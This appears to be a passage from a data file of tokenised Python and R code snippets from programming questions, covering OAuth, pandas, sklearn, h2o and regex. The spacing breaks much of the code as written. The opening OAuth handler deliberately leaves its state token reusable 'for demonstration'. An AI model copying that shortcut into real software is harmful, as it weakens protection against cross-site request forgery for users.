supposed to . if request.args.get ( 'state ' , `` ) ! = session.get ( 'state ' , `` ) : response = make_response ( json.dumps ( 'Invalid state parameter . ' ) , 401 ) response.headers [ 'Content-Type ' ] = 'application/json ' return response # Normally the state would be a one-time use token , however in our # simple case , we want a user to be able to connect and disconnect # without reloading the page . Thus , for demonstration , we do n't # implement this best practice . session.pop ( 'state ' ) gplus_id = request.args.get ( 'gplus_id ' ) code = request.data try : # Upgrade the authorization code into a credentials object oauth_flow = client.flow_from_clientsecrets ( 'client_secrets.json ' , scope= '' ) oauth_flow.redirect_uri = 'postmessage ' credentials = oauth_flow.step2_exchange ( code ) except client.FlowExchangeError : app.logger.debug ( `` connect : Failed to upgrade the authorization code '' ) response = make_response ( json.dumps ( 'Failed to upgrade the authorization code . ' ) , 401 ) response.headers [ 'Content-Type ' ] = 'application/json ' return response # Check that the access token is valid . access_token = credentials.access_token url = ( 'https : //www.googleapis.com/oauth2/v1/tokeninfo ? access_token= % s ' % access_token ) h = httplib2.Http ( ) result = json.loads ( h.request ( url , 'GET ' ) [ 1 ] ) # If there was an error in the access token info , abort . if result.get ( 'error ' ) is not None : response = make_response ( json.dumps ( result.get ( 'error ' ) ) , 500 ) response.headers [ 'Content-Type ' ] = 'application/json ' return response # Verify that the access token is used for the intended user . if result [ 'user_id ' ] ! = gplus_id : response = make_response ( json.dumps ( `` Token 's user ID does n't match given user ID . `` ) , 401 ) response.headers [ 'Content-Type ' ] = 'application/json ' return response ..."
"class plot_svg ( object ) : def __init__ ( self , view ) : self.view = view def __call__ ( self , *args , **kwargs ) : print args , kwargs fig = self.view ( *args , **kwargs ) canvas=FigureCanvas ( fig ) response=HttpResponse ( content_type='image/svg+xml ' ) canvas.print_svg ( response ) return response def as_avg ( self ) : return plot_svg ( self.output ) ( ) @ plot_svgdef as_svg ( self ) : return self.output ( ) as_svg ( ) takes exactly 1 argument ( 0 given )"
"> > > aarray ( [ [ 0 , 1 , 1 , 1 ] , [ 1 , 2 , 3 , 4 ] , [ 4 , 5 , 6 , 6 ] , [ 4 , 5 , 6 , 7 ] ] ) > > > indices_to_skip = [ 0,1,2 ]"
"def foo ( arg1 , arg2 ) : passf=foo # How do I find out want the 1st argument to f is called ? I want 'arg1 ' as an answer"
"def run_normalizers ( config , debug , num_threads , name=None ) : def _run ( ) : print ( 'Started process for normalizer ' ) sqla_engine = init_sqla_from_config ( config ) image_vfs = create_s3vfs_from_config ( config , config.AWS_S3_IMAGE_BUCKET ) storage_vfs = create_s3vfs_from_config ( config , config.AWS_S3_STORAGE_BUCKET ) pp = PipedPiper ( config , image_vfs , storage_vfs , debug=debug ) if name : pp.run_pipeline_normalizers ( name ) else : pp.run_all_normalizers ( ) print ( 'Normalizer process complete ' ) threads = [ ] for i in range ( num_threads ) : threads.append ( multiprocessing.Process ( target=_run ) ) [ t.start ( ) for t in threads ] [ t.join ( ) for t in threads ] run_normalizers ( ... )"
├── mymain.py└── myothermodule.py import myothermodule ImportError : No module named myothermodule
def get_base_data ( func ) : def wrapper ( request ) : d = func ( request ) user_id = request.user.id # used in query contact_group_data = ContactGroups.query.filter ( ... criteria ... ) .all ( ) d [ 'contact_group_data ' ] = contact_group_data return d return wrapper @ view_config ( ... ) @ get_base_datadef my_handler ( request ) : pass # rest of code ...
"var=3.145623print ( `` This is { 0 : .2f } '' .format ( var ) ) > > > This is 3.14 var = `` n/a '' print ( `` This is { 0 : .2f } '' .format ( var ) ) > > > File `` < stdin > '' , line 1 , in < module > > > > ValueError : Unknown format code ' f ' for object of type 'str '"
"train_h2o < - as.h2o ( train_data ) test_h2o < - as.h2o ( test_data ) mape_calc < - function ( sub_df ) { pred < - predict.glm ( glm_model , sub_df ) actual < - sub_df $ Ptot mape < - 100 * mean ( abs ( ( actual - pred ) /actual ) ) new_df < - data.frame ( date = sub_df $ date [ [ 1 ] ] , mape = mape ) return ( new_df ) } # LIST OF ONE-ROW DATAFRAMESdf_list < - by ( test_data , test_data $ date , map_calc ) # FINAL DATAFRAMEfinal_df < - do.call ( rbind , df_list ) y < - `` RealPtot '' # targetx < - names ( train_h2o ) % > % setdiff ( y ) # featuresrforest.model < - h2o.randomForest ( y=y , x=x , training_frame = train_h2o , ntrees = 2000 , mtries = 3 , max_depth = 4 , seed = 1122 ) predict.rforest < - as.data.frame ( h2o.predict ( rforest.model , test_h2o ) library ( tidyverse ) library ( h2o ) h2o.init ( ip= '' localhost '' , port=54322 , max_mem_size = `` 128g '' ) data ( Boston , package = `` MASS '' ) names ( Boston ) [ 1 ] `` crim '' `` zn '' `` indus '' `` chas '' `` nox '' `` rm '' `` age '' `` dis '' `` rad '' `` tax '' `` ptratio '' [ 12 ] `` black '' `` lstat '' `` medv '' set.seed ( 4984 ) # Added 15 minute Time and date interval Boston $ date < - seq ( as.POSIXct ( `` 01-09-2017 03:00 '' , format = `` % d- % m- % Y % H : % M '' , tz= '' '' ) , by = `` 15 min '' , length = 506 ) # select first 333 values to be trained and the rest to be test datatrain = Boston [ 1:333 , ] test = Boston [ 334:506 , ] # Dropped the date and timetrain_data_finialized < - subset ( train , select=-c ( date ) ) test_data_finialized < - test # Converted the dataset to h2o object.train_h2o < - as.h2o ( train_data_finialized ) # test_h2o < - as.h2o ( test ) # Select the target and feature variables for h2o modely < - `` medv '' # targetx < - names ( train_data_finialized ) % > % setdiff ( y ) # feature variables # Number of CV folds ( to generate level-one data for stacking ) nfolds < - 5 # Replaced RF model by GBM because GBM run faster # Train & Cross-validate a GBMmy_gbm < - h2o.gbm ( x = x , y = y , training_frame = train_h2o , nfolds = nfolds , fold_assignment = `` Modulo '' , keep_cross_validation_predictions = TRUE , seed = 1 ) mape_calc < - function ( sub_df ) { p < - h2o.predict ( my_gbm , as.h2o ( sub_df ) ) pred < - as.vector ( p ) actual < - sub_df $ medv mape < - 100 * mean ( abs ( ( actual - pred ) /actual ) ) new_df < - data.frame ( date = sub_df $ date [ [ 1 ] ] , mape = mape ) return ( new_df ) } # LIST OF ONE-ROW DATAFRAMESdf_list < - by ( test_data_finialized , test_data_finialized $ date , mape_calc ) final_df < - do.call ( rbind , df_list )"
with example ( ) as x : print ( x ) with example ( ) as x : y : str = x print ( y )
"import numpy as npprint ( np.array ( [ i for i in range ( 81 ) ] ) .reshape ( ( 9 , 9 ) ) ) - > [ [ 0 1 2 3 4 5 6 7 8 ] [ 9 10 11 12 13 14 15 16 17 ] [ 18 19 20 21 22 23 24 25 26 ] [ 27 28 29 30 31 32 33 34 35 ] [ 36 37 38 39 40 41 42 43 44 ] [ 45 46 47 48 49 50 51 52 53 ] [ 54 55 56 57 58 59 60 61 62 ] [ 63 64 65 66 67 68 69 70 71 ] [ 72 73 74 75 76 77 78 79 80 ] ] boxes = [ [ 44 , 43 , 42 , 53 ] , [ 46 , 47 , 38 ] , [ 61 , 60 ] , [ 69 , 70 ] , [ 71 , 62 ] , [ 0 , 9 , 18 ] , [ 1 , 10 , 11 , 20 ] , [ 2 , 3 , 12 ] , [ 4 , 13 , 14 ] , [ 5 , 6 ] , [ 7 , 8 ] , [ 17 , 26 , 35 ] , [ 21 , 22 , 23 ] , [ 15 , 16 , 24 , 25 , 34 ] , [ 27 , 36 , 37 ] , [ 19 , 28 , 29 ] , [ 45 , 54 ] , [ 55 , 56 ] , [ 63 , 64 , 65 ] , [ 72 , 73 , 74 ] , [ 57 , 66 , 75 ] , [ 58 , 59 , 67 , 68 ] , [ 76 , 77 ] , [ 78 , 79 , 80 ] ] def isSquare ( array ) : if np.sum ( array ) in [ i**2 for i in range ( 1,7 ) ] : return True else : return False def twice ( array ) : counter = [ 0 ] *9 for i in range ( len ( array ) ) : counter [ array [ i ] -1 ] +=1 if 3 in counter : return False if counter.count ( 2 ) > 1 : return False return True from itertools combinations_with_replacementsolutions = [ ] for k in range ( 2 , 6 ) : solutions.append ( [ list ( i ) for i in combinations_with_replacement ( np.arange ( 1 , 10 ) , k ) if isSquare ( i ) and twice ( i ) ] ) from itertools import permutationsdef find_squares ( ) : solutions = [ ] for k in range ( 2 , 6 ) : solutions.append ( [ list ( i ) for i in combinations_with_replacement ( np.arange ( 1 , 10 ) , k ) if isSquare ( i ) and twice ( i ) ] ) s = [ ] for item in solutions : d= [ ] for arr in item : for k in permutations ( arr ) : d.append ( list ( k ) ) s.append ( d ) return s # 4-dimensional array , max 2 of eachsolutions = find_squares ( ) total = sum ( [ len ( i ) for i in solutions ] ) print ( total ) - > 8782 def legal_row ( arr ) : for k in range ( len ( arr ) ) : values = [ ] for i in range ( len ( arr [ k ] ) ) : if ( arr [ k ] [ i ] ! = 0 ) : if ( arr [ k ] [ i ] in values ) : return False else : values.append ( arr [ k ] [ i ] ) return Truedef legal_column ( arr ) : return legal_row ( np.array ( arr , dtype=int ) .T ) def legal_box ( arr ) : return legal_row ( arr.reshape ( 3,3,3,3 ) .swapaxes ( 1,2 ) .reshape ( 9,9 ) ) def legal ( arr ) : return ( legal_row ( arr ) and legal_column ( arr ) and legal_box ( arr ) ) attempts = 1000correct = 0possibleBoards = [ ] for i in range ( 1 , attempts+1 ) : board = np.zeros ( ( 9 , 9 ) , dtype=int ) score = 0 shapes = boxes np.random.shuffle ( shapes ) for block in shapes : new_board = board new_1d = board.reshape ( 81 ) all_sols = solutions [ len ( block ) -2 ] np.random.shuffle ( all_sols ) for sols in all_sols : # print ( len ( sols ) ) new_1d [ block ] = sols new_board = new_1d.reshape ( ( 9 , 9 ) ) if legal ( new_board ) : board = new_board score+=1 break confirm = board.reshape ( 81 ) # solve ( board ) # Using my solve function , not important here # Note that without it , correct would always be 0 as the middle of the puzzle has no boxes confirm = board.reshape ( 81 ) if ( i % 1000==0 or i==1 ) : print ( `` Attempt '' , i ) if 0 not in confirm : correct+=1 print ( correct ) possibleBoards.append ( board )"
> > > 'hello ' * 5'hellohellohellohellohello '
"> > > from collections import OrderedDict > > > data = OrderedDict ( zip ( 'xy ' , 'xy ' ) ) > > > def foo ( **kwargs ) : ... return kwargs == data ... > > > foo ( x= ' x ' , y= ' y ' ) # expected result : TrueTrue > > > foo ( y= ' y ' , x= ' x ' ) # expected result : FalseTrue"
"def iterate ( f , x ) : while True : yield x x = f ( x ) def iterate ( f , x ) : return accumulate ( repeat ( x ) , lambda acc , _ : f ( acc ) )"
"class graph : def __init__ ( self ) : self.window = gtk.Window ( ) self.figure = plt.figure ( ) self.ax = self.figure.add_subplot ( 111 ) self.canvas = FigureCanvas ( self.figure ) self.window.add ( self.canvas ) self.graph = None def plot ( self , xData , yData ) : if len ( xData ) > 1 and len ( yData ) > 1 : self.graph , = self.ax.hexbin ( self.xData , self.yData ) # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # This is where the code throws the error # # # # def update ( self , xData , yData ) : self.graph.set_xdata ( np.append ( self.graph.get_xdata ( ) , xData ) ) self.graph.set_ydata ( np.append ( self.graph.get_ydata ( ) , yData ) ) self.figure.canvas.draw ( ) graph = graph ( ) graph.plot ( someXData , someYData ) # when new data is receivedgraph.update ( newXData , newYData )"
"def test_add_dependency ( self ) : `` '' '' Tasks can be added with dependencies '' '' '' # TODO : Unreliable test , may work sometimes because by default , task # running order is indeterminate . self.done = [ ] def test ( id ) : self.done.append ( `` Test `` + id ) s = Schedule ( ) tA = Task ( `` Test A '' , partial ( test , `` A '' ) ) tB = Task ( `` Test B '' , partial ( test , `` B '' ) ) s.add_task ( tA ) s.add_task ( tB ) s.add_dependency ( tA , tB ) s.run ( ) self.assertEqual ( self.done , [ `` Test B '' , `` Test A '' ] )"
"class Foo ( object ) : def bar ( ) : print 'We\ 're out of Red Leicester . 'class LogWrapped ( object ) : def __init__ ( self , wrapped ) : self.wrapped = wrapped def __getattr__ ( self , name ) : attr = getattr ( self.wrapped , name ) if not callable ( attr ) : return attr else : def fun ( *args , **kwargs ) : print 'Calling ' , name attr ( *args , **kwargs ) print 'Called ' , name return funclass FooFactory ( object ) : def get_foo ( with_logging = False ) : if not with_logging : return Foo ( ) else : return LogWrapped ( Foo ( ) ) foo_fact = FooFactory ( ) my_foo = foo_fact.get_foo ( True ) isinstance ( my_foo , Foo ) # False !"
"from mysql.connector import ( connection ) import datetime < br > conn = connection.MySQLConnection ( user='user ' , password='pass ' , host='host ' , database='db ' ) single_col_query = `` select comp from logons where dt between % s and % s '' multi_col_query = `` select comp , user from logons where dt between % s and % s '' end_dt = datetime.datetime.now ( ) begin_dt = datetime.datetime ( end_dt.year , end_dt.month , 1 , 0 , 0 , 0 ) cursor = conn.cursor ( ) cursor.execute ( single_col_query , ( begin_dt , end_dt ) ) for ( comp ) in cursor : print ( comp ) # ex . ( 'tech-pc-1 ' , ) or ( u'tech-pc-1 ' , ) cursor.execute ( multi_col_query , ( begin_dt , end_dt ) ) for ( comp , user ) in cursor : print ( comp , user ) # ex . tech-pc-1 jdoecursor.close ( ) conn.close ( )"
"# ! /usr/bin/env python # Simple classifier test. # Adapted from the svm_test.py file included in the standard libsvm distribution.from collections import defaultdictfrom svm import * # Define our sparse data formatted training and testing sets.labels = [ 1,2,3,4 ] train = [ # key : 0=mean , 1=stddev { 0:2.5,1:3.5 } , { 0:5,1:1.2 } , { 0:7,1:3.3 } , { 0:10.3,1:0.3 } , ] problem = svm_problem ( labels , train ) test = [ ( { 0:3 , 1:3.11 } ,1 ) , ( { 0:7.3,1:3.1 } ,3 ) , ( { 0:7,1:3.3 } ,3 ) , ( { 0:9.8,1:0.5 } ,4 ) , ] # Test classifiers.kernels = [ LINEAR , POLY , RBF ] kname = [ 'linear ' , 'polynomial ' , 'rbf ' ] correct = defaultdict ( int ) for kn , kt in zip ( kname , kernels ) : print kt param = svm_parameter ( kernel_type = kt , C=10 , probability = 1 ) model = svm_model ( problem , param ) for test_sample , correct_label in test : pred_label , pred_probability = model.predict_probability ( test_sample ) correct [ kn ] += pred_label == correct_label # Show results.print '-'*80print 'Accuracy : 'for kn , correct_count in correct.iteritems ( ) : print '\t ' , kn , ' % .6f ( % i of % i ) ' % ( correct_count/float ( len ( test ) ) , correct_count , len ( test ) )"
"import pandas as pdfrom sklearn.base import BaseEstimator , TransformerMixinfrom sklearn.feature_selection import SelectKBestfrom sklearn.preprocessing import LabelEncoderfrom sklearn.model_selection import GridSearchCVfrom sklearn.model_selection import train_test_splitfrom sklearn.ensemble import RandomForestClassifierfrom sklearn.pipeline import Pipelinefrom sklearn.metrics import roc_curve , aucimport matplotlib.pyplot as pltfrom sklearn.metrics import confusion_matrixfrom sklearn.metrics import f1_scoreclass FillNa ( BaseEstimator , TransformerMixin ) : def transform ( self , x , y=None ) : non_numerics_columns = x.columns.difference ( x._get_numeric_data ( ) .columns ) for column in x.columns : if column in non_numerics_columns : x.loc [ : , column ] = x.loc [ : , column ] .fillna ( df [ column ] .value_counts ( ) .idxmax ( ) ) else : x.loc [ : , column ] = x.loc [ : , column ] .fillna ( x.loc [ : , column ] .mean ( ) ) return x def fit ( self , x , y=None ) : return selfclass CategoricalToNumerical ( BaseEstimator , TransformerMixin ) : def transform ( self , x , y=None ) : non_numerics_columns = x.columns.difference ( x._get_numeric_data ( ) .columns ) le = LabelEncoder ( ) for column in non_numerics_columns : x.loc [ : , column ] = x.loc [ : , column ] .fillna ( x.loc [ : , column ] .value_counts ( ) .idxmax ( ) ) le.fit ( x.loc [ : , column ] ) x.loc [ : , column ] = le.transform ( x.loc [ : , column ] ) .astype ( int ) return x def fit ( self , x , y=None ) : return selfclass Perf ( BaseEstimator , TransformerMixin ) : def fit ( self , clf , x , y , perf= '' all '' ) : `` '' '' Only for classifier model . Return AUC , ROC , Confusion Matrix and F1 score from a classifier and df You can put a list of eval instead a string for eval paramater . Example : eval= [ 'all ' , 'auc ' , 'roc ' , 'cm ' , 'f1 ' ] will return these 4 evals. `` '' '' evals = { } y_pred_proba = clf.predict_proba ( x ) [ : , 1 ] y_pred = clf.predict ( x ) perf_list = perf.split ( ' , ' ) if ( `` all '' or `` roc '' ) in perf.split ( ' , ' ) : fpr , tpr , _ = roc_curve ( y , y_pred_proba ) roc_auc = round ( auc ( fpr , tpr ) , 3 ) plt.style.use ( 'bmh ' ) plt.figure ( figsize= ( 12 , 9 ) ) plt.title ( 'ROC Curve ' ) plt.plot ( fpr , tpr , ' b ' , label='AUC = { } '.format ( roc_auc ) ) plt.legend ( loc='lower right ' , borderpad=1 , labelspacing=1 , prop= { `` size '' : 12 } , facecolor='white ' ) plt.plot ( [ 0 , 1 ] , [ 0 , 1 ] , ' r -- ' ) plt.xlim ( [ -0.1 , 1 . ] ) plt.ylim ( [ -0.1 , 1 . ] ) plt.ylabel ( 'True Positive Rate ' ) plt.xlabel ( 'False Positive Rate ' ) plt.show ( ) if `` all '' in perf_list or `` auc '' in perf_list : fpr , tpr , _ = roc_curve ( y , y_pred_proba ) evals [ 'auc ' ] = auc ( fpr , tpr ) if `` all '' in perf_list or `` cm '' in perf_list : evals [ 'cm ' ] = confusion_matrix ( y , y_pred ) if `` all '' in perf_list or `` f1 '' in perf_list : evals [ 'f1 ' ] = f1_score ( y , y_pred ) return evalspath = '~/proj/akd-doc/notebooks/data/'df = pd.read_csv ( path + 'titanic_tuto.csv ' , sep= ' ; ' ) y = df.pop ( 'Survival-Status ' ) .replace ( to_replace= [ 'dead ' , 'alive ' ] , value= [ 0. , 1 . ] ) X = df.copy ( ) X_train , X_test , y_train , y_test = train_test_split ( X.copy ( ) , y.copy ( ) , test_size=0.2 , random_state=42 ) percent = 0.50nb_features = round ( percent * df.shape [ 1 ] ) + 1clf = RandomForestClassifier ( ) pipeline = Pipeline ( [ ( 'fillna ' , FillNa ( ) ) , ( 'categorical_to_numerical ' , CategoricalToNumerical ( ) ) , ( 'features_selection ' , SelectKBest ( k=nb_features ) ) , ( 'random_forest ' , clf ) , ( 'perf ' , Perf ( ) ) ] ) params = dict ( random_forest__max_depth=list ( range ( 8 , 12 ) ) , random_forest__n_estimators=list ( range ( 30 , 110 , 10 ) ) ) cv = GridSearchCV ( pipeline , param_grid=params ) cv.fit ( X_train , y_train ) TypeError : If no scoring is specified , the estimator passed should have a 'score ' method . The estimator Pipeline ( steps= [ ( 'fillna ' , FillNa ( ) ) , ( 'categorical_to_numerical ' , CategoricalToNumerical ( ) ) , ( 'features_selection ' , SelectKBest ( k=10 , score_func= < function f_classif at 0x7f4ed4c3eae8 > ) ) , ( 'random_forest ' , RandomForestClassifier ( bootstrap=True , class_weight=None , criterion='gini ' , max_depth=None , ... =1 , oob_score=False , random_state=None , verbose=0 , warm_start=False ) ) , ( 'perf ' , Perf ( ) ) ] ) does not ."
> > > from multiprocessing import Process > > > import requests > > > from pprint import pprint > > > Process ( target=lambda : pprint ( requests.get ( 'https : //api.github.com ' ) ) ) .start ( ) > > > < Response [ 200 ] > # this is the response displayed by the call to ` pprint ` . > > > import nltk > > > Process ( target=lambda : pprint ( requests.get ( 'https : //api.github.com ' ) ) ) .start ( ) > > > # nothing happens ! $ > python -- versionPython 2.7.5 $ > pip freeze | grep nltknltk==2.0.5 $ > pip freeze | grep requestsrequests==2.2.1
"John JeffriesJohn Jeffries , M.D.John Jeffries , MDJohn Jeffries and Jim SmithJohn and Jim JeffriesJohn Jeffries & Jennifer Wilkes-Smith , DDS , MDJohn Jeffries , CPA & Jennifer Wilkes-Smith , DDS , MDJohn Jeffries , C.P.A & Jennifer Wilkes-Smith , DDS , MDJohn Jeffries , C.P.A. , MD & Jennifer Wilkes-Smith , DDS , MDJohn Jeffries M.D . and Jennifer Holmes CPAJohn Jeffries M.D . & Jennifer Holmes CPA ( ? P < first_name > \S*\s* ) ? ( ? ! and\s| & \s ) ( ? P < last_name > [ \w- ] *\s* ) ( ? P < titles1 > , ? \s* ( ? ! and\s| & \s ) [ \w\. ] * , *\s* ( ? ! and\s| & \s ) [ \w\. ] * ) ? ( ? P < connector > \sand\s|\s* & *\s* ) ? ( ? ! and\s| & \s ) ( ? P < first_name2 > \S*\s* ) ( ? P < last_name2 > [ \w- ] *\s* ) ? ( ? P < titles2 > , ? \s* [ \w\. ] * , *\s* [ \w\. ] * ) ? 'John Jeffries , C.P.A. , MD & Jennifer Wilkes-Smith , DDS , MD ' connector : & first_name : Johnfirst_name2 : Jenniferlast_name : Jeffrieslast_name2 : Wilkes-Smithtitles1 : , C.P.A. , MDtitles2 : , DDS , MD 'John Jimmy Jeffries , C.P.A. , MD & Jennifer Wilkes-Smith , DDS , MD '' John Jeffries , C.P.A. , MD & Jennifer Jenny Wilkes-Smith , DDS , MD '"
"def get_best_fit ( image_array , fixedX , fixedY ) : weights = np.array ( image_array ) x = np.where ( weights > 0 ) [ 1 ] y = np.where ( weights > 0 ) [ 0 ] size = len ( image_array ) * len ( image_array [ 0 ] ) y = np.zeros ( ( len ( image_array ) , len ( image_array [ 0 ] ) ) ) for i in range ( len ( np.where ( weights > 0 ) [ 0 ] ) ) : y [ np.where ( weights > 0 ) [ 0 ] [ i ] ] [ np.where ( weights > 0 ) [ 1 ] [ i ] ] = np.where ( weights > 0 ) [ 0 ] [ i ] y = y.reshape ( size ) x = np.array ( range ( len ( image_array ) ) * len ( image_array [ 0 ] ) ) weights = weights.reshape ( ( size ) ) b , m = polyfit ( x , y , 1 , w=weights ) angle = math.atan ( m ) * 180/math.pi return b , m , angle"
"import numpy as npimport pandas as pddf = pd.DataFrame ( np.arange ( 0 , 24 ) .reshape ( ( 3 , 8 ) ) ) df.columns = pd.MultiIndex.from_arrays ( [ [ 'a1 ' , 'a1 ' , 'a2 ' , 'a2 ' , 'b1 ' , 'b1 ' , 'b2 ' , 'b2 ' ] , [ '4th ' , '5th ' , '4th ' , '5th ' , '4th ' , '5th ' , '4th ' , '5th ' ] ] ) print ( df ) a1 a2 b1 b2 4th 5th 4th 5th 4th 5th 4th 5th0 0 1 2 3 4 5 6 71 8 9 10 11 12 13 14 152 16 17 18 19 20 21 22 23 label_dict = { 'a1 ' : ' A ' , 'a2 ' : ' A ' , 'b1 ' : ' B ' , 'b2 ' : ' B ' } res = df.groupby ( label_dict , axis=1 , level=0 ) .sum ( ) print ( res ) A B0 6 221 38 542 70 86 A A B B 4th 5th 4th 5th0 2 4 10 121 18 21 26 282 34 36 42 44"
"try : from setuptools import setup except ImportError : from distutils.core import setup config = { 'description ' : 'Amateur Remake of the Clannad Visual Novel ' , 'author ' : 'Kristopher Anders ' , 'url ' : 'Unavailable Online . ' , 'download_url ' : 'Not Available online . ' , 'author_email ' : 'kanders91 @ gmail.com ' , 'version ' : ' 0.1 ' , 'install_requires ' : [ 'nose ' ] 'packages ' : [ 'seen0414 ' ] , 'scripts ' : [ ] , 'name ' : 'Clannad Visual Novel ' } setup ( **config ) | -- -Clannad \\root directly for 'setup.py ' \\ | -- -bin | -- -docs | -- -seen0414 | -- -__init__.py -- \\contents is exact copy of 'seen0414.py'\\ | -- -__init__.pyc \\otherwise '__init__.py ' was empty.\\ | -- -module0414.py -- \\contains functions for 'seen0414'\\ | -- -module0414.pyc | -- -script0414.txt -- \\contains necessary text for 'module0414.py'\\ | -- -seen0414.py -- \\original ( main ) script\\ | -- -tests | -- -clannad_tests.py | -- -clannad_tests.pyc | -- -__init__.py | -- -__init__.pyc | -- -setup.py"
"class Realm ( object ) : def __init__ ( self , username , password ) class Blog ( object ) : def __init__ ( self , realm , name ) class Post ( object ) ; def __init__ ( self , blog , title , body ) class Realm ( object ) : def __init__ ( self , username , password ) : ... def createBlog ( self , name ) : return Blog ( self , name ) realm = Realm ( `` admin '' , `` FDS $ # % '' ) blog = realm.createBlog ( `` Kittens ! `` ) post = blog.createPost ( `` Cute kitten '' , `` Some HTML blah blah '' ) realm = Realm ( `` admin '' , `` FDS $ # % '' ) blog = realm.Blog ( `` Kittens ! '' )"
"# necessary packagesfrom sklearn.datasets import load_breast_cancerimport pandas as pdimport numpy as npfrom keras.models import Sequentialfrom keras.layers import Densefrom keras.layers import Dropout # load datask_data = load_breast_cancer ( return_X_y=False ) # safe data in pandasdata = sk_data [ 'data ' ] target = sk_data [ 'target ' ] target_names = sk_data [ 'target_names ' ] feature_names = sk_data [ 'feature_names ' ] data = pd.DataFrame ( data=data , columns=feature_names ) # build ANNmodel = Sequential ( ) model.add ( Dense ( 64 , kernel_initializer='random_uniform ' , input_dim=30 , activation='relu ' ) ) model.add ( Dropout ( 0.25 ) ) model.add ( Dense ( 32 , kernel_initializer='random_uniform ' , activation='relu ' ) ) model.add ( Dropout ( 0.25 ) ) model.add ( Dense ( 1 , activation='sigmoid ' ) ) # train ANNmodel.compile ( loss='binary_crossentropy ' , optimizer='adam ' , metrics= [ 'accuracy ' ] ) model.summary ( ) model.fit ( data , target , epochs=50 , batch_size=10 , validation_split=0.2 ) # evalpred = model.predict ( data ) # calculate precision-recall curvefrom sklearn.metrics import precision_recall_curveprecision , recall , thresholds = precision_recall_curve ( target , pred ) # precision-recall curve and f1import matplotlib.pyplot as plt # pyplot.plot ( [ 0 , 1 ] , [ 0.5 , 0.5 ] , linestyle= ' -- ' ) plt.plot ( recall , precision , marker= ' . ' ) # show the plotplt.show ( ) len ( np.unique ( pred ) ) # 569len ( thresholds ) # 417"
"> > > f=open ( `` c : \setup.log '' , '' r '' ) > > > type ( f ) < class '_io.TextIOWrapper ' > > > > help ( _io.TextIOWrapper ) Traceback ( most recent call last ) : File `` < pyshell # 204 > '' , line 1 , in < module > help ( _io.TextIOWrapper ) NameError : name '_io ' is not defined > > > help ( io.TextIOWrapper ) Help on class TextIOWrapper in module io :"
"# set the axis limitsTmin = -100 # min temperature to plotTmax = 40 # max temperaturePmin = 100 # min pressurePmax = 1000 # max pressureplt.axis ( [ Tmin , Tmax , Pmax , Pmin ] ) # make the vertical axis a log-axisplt.semilogy ( ) # make a custom list of tick values and labelsplist = range ( Pmin , Pmax,100 ) plabels = [ ] for p in plist : plabels.append ( str ( p ) ) plt.yticks ( plist , plabels )"
"def permutations ( items ) : n = len ( items ) if n==0 : yield [ ] else : for i in range ( len ( items ) ) : for cc in permutations ( items [ : i ] +items [ i+1 : ] ) : yield [ items [ i ] ] +ccfor p in permutations ( [ ' r ' , ' e ' , 'd ' ] ) : print ( `` .join ( p ) ) for p in permutations ( list ( `` game '' ) ) : print ( `` .join ( p ) + `` , `` , end= '' '' )"
{ % include `` a_dir/stuff.html '' with text= { % trans `` Load more promotions '' % } % }
": ref : ` release < pandas : release > ` { 'python ' : ( 'http : //docs.python.org/ ' , None ) , 'pandas ' : ( 'http : //pandas.pydata.org/pandas-docs/dev ' , None ) } ` : ref : ` apply < pandas : pandas.dataframe.apply > ` : ref : ` apply < pandas : pandas-dataframe-apply > ` : ref : ` apply < pandas : dataframe.apply > ` : ref : ` apply < pandas : DataFrame.apply > ` : ref : ` apply < pandas.DataFrame.apply > ` : ref : ` apply < pandas.dataframe.apply > ` : meth : ` apply < pandas : pandas.dataframe.apply > ` : meth : ` pandas : pandas.dataframe.apply ` : meth : ` pandas.dataframe.apply ` : meth : ` apply < pandas : pandas.DataFrame.apply > ` : meth : ` pandas : pandas.DataFrame.apply ` : meth : ` pandas.DataFrame.apply `"
"dialog=Gtk.FileChooserDialog ( `` Select a file '' , self , Gtk.FileChooserAction.OPEN , ( Gtk.STOCK_CANCEL , Gtk.ResponseType.CANCEL , Gtk.STOCK_OPEN , Gtk.ResponseType.OK ) ) response=dialog.run ( )"
"OPS = ( '+ ' , '- ' , '* ' , '/ ' ) def f ( expr ) : `` '' '' Generates FP exprs Recursive formula : f ( expr1 [ op ] expr2 ) = ( f ( expr1 ) [ op ] f ( expr2 ) ) `` '' '' if expr.isdigit ( ) : yield expr # return [ expr ] # ret = [ ] first = `` i = 0 while i < len ( expr ) : if expr [ i ] not in OPS : first += expr [ i ] i += 1 else : op = expr [ i ] i += 1 second = expr [ i : ] firstG , secondG = f ( first ) , f ( second ) for e in ( ' ( ' + e1 + op + e2 + ' ) ' for e1 in firstG for e2 in secondG ) : yield e # ret.append ( e ) first += op # return ret"
"while line : = fp.readline ( ) : do_stuff ( line ) > > > w : =1 File `` < stdin > '' , line 1 w : =1 ^SyntaxError : invalid syntax > > > ( w : =1 ) 1 > > > w = 1 > > > w + w2 > > > w == wTrue > > > w is wTrue > > > w < wFalse"
"Traceback ( most recent call last ) : File `` /home/benbartling/anaconda3/lib/python3.6/site-packages/IPython/core/interactiveshell.py '' , line 2963 , in run_code exec ( code_obj , self.user_global_ns , self.user_ns ) File `` < ipython-input-1-81066d3a41c5 > '' , line 1 , in < module > import retro File `` /home/benbartling/anaconda3/lib/python3.6/site-packages/retro/__init__.py '' , line 206 print `` % s : % s '' % ( key , value ) ^SyntaxError : invalid syntax"
"import timeitprint timeit.timeit ( `` math.pow ( 2 , 100 ) '' , setup='import math ' ) print timeit.timeit ( `` 2.0 ** 100.0 '' ) print timeit.timeit ( `` 2 ** 100 '' ) print timeit.timeit ( `` 2.01 ** 100.01 '' ) 0.3296399116520.03612589836120.03642606735230.0363788604736"
"winner_freq = pd.DataFrame ( player_match.winner.value_counts ( ) .reset_index ( ) ) winner_freq_plot = sns.barplot ( x='index ' , y='winner ' , data=winner_freq ) winner_freq_plot.set_xticklabels ( winner_freq_plot.get_xticklabels ( ) , rotation=90 )"
class B ( type ) : __slots__ = ( ) class A ( metaclass=B ) : passA.test = `` test ''
